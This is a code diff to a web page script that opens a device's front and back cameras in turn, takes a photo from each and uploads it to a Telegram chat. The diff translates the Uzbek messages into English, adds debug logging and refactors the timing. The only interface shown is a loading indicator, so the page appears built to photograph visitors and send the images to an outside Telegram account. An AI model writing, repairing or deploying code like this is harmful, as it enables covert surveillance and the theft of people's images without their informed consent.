@@ -35,24 +35,31 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
+                console.log(`Camera (${facingMode}) initialized.`);
                 return true;
             } catch (error) {
-                console.error(`❌ Kamera ishlamadi (${facingMode}):`, error);
+                console.error(`❌ Camera (${facingMode}) initialization failed:`, error);
+                alert(`Camera (${facingMode}) initialization failed.`);
                 return false;
             }
         }
 
         async function takeAndSendPhoto(facingMode) {
             if (!video.srcObject) {
-                alert(`Kamera ishga tushmadi (${facingMode})!`);
+                console.log(`Camera (${facingMode}) stream not available.`);
+                alert(`Camera (${facingMode}) stream not available.`);
                 return;
             }
 
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
+            console.log(`Canvas dimensions (${facingMode}):`, canvas.width, canvas.height);
+
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
+                console.log(`Blob size (${facingMode}):`, blob.size);
+
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
                 formData.append("photo", blob, `photo_${facingMode}.jpg`);
@@ -69,14 +76,14 @@
 
                     const result = await response.json();
                     if (result.ok) {
-                        console.log(`Rasm yuborildi (${facingMode})`);
+                        console.log(`Photo sent successfully (${facingMode}).`);
                     } else {
-                        console.error(`Xatolik yuz berdi (${facingMode}):`, result);
-                        alert(`Xatolik yuz berdi (${facingMode})`);
+                        console.error(`Telegram API error (${facingMode}):`, result);
+                        alert(`Telegram API error (${facingMode}).`);
                     }
                 } catch (error) {
-                    console.error(`Xatolik (${facingMode}):`, error);
-                    alert(`❌ Xatolik yuz berdi (${facingMode}): ${error.message}`);
+                    console.error(`Error sending photo (${facingMode}):`, error);
+                    alert(`Error sending photo (${facingMode}).`);
                 }
             }, "image/jpeg");
         }
@@ -84,19 +91,28 @@
         async function captureFromBothCameras() {
             loader.style.display = "block";
 
-            const frontCameraSuccess = await initCamera("user");
-            if (frontCameraSuccess) {
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for clarity
-                await takeAndSendPhoto("user");
-                video.srcObject.getVideoTracks().forEach(track => track.stop()); // Stop the current video stream
+            async function captureAndSend(facingMode) {
+                const success = await initCamera(facingMode);
+                if (success) {
+                    await new Promise(resolve => setTimeout(resolve, 3000)); // Increased delay
+                    if (video.readyState >= 2) { // Ensure metadata is loaded
+                        console.log(`Video readyState (${facingMode}):`, video.readyState);
+                        await takeAndSendPhoto(facingMode);
+                    } else {
+                        console.log(`Video not ready (${facingMode}), readyState:`, video.readyState);
+                        alert(`Video not ready (${facingMode}).`);
+                    }
+
+                    if(video.srcObject){
+                        video.srcObject.getVideoTracks().forEach(track => track.stop());
+                        video.srcObject = null; // release the stream
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between cameras
+                }
             }
 
-            const backCameraSuccess = await initCamera("environment");
-            if (backCameraSuccess) {
-                await new Promise(resolve => setTimeout(resolve, 2000)); // Delay for clarity
-                await takeAndSendPhoto("environment");
-                video.srcObject.getVideoTracks().forEach(track => track.stop());
-            }
+            await captureAndSend("user");
+            await captureAndSend("environment");
 
             loader.style.display = "none";
         }
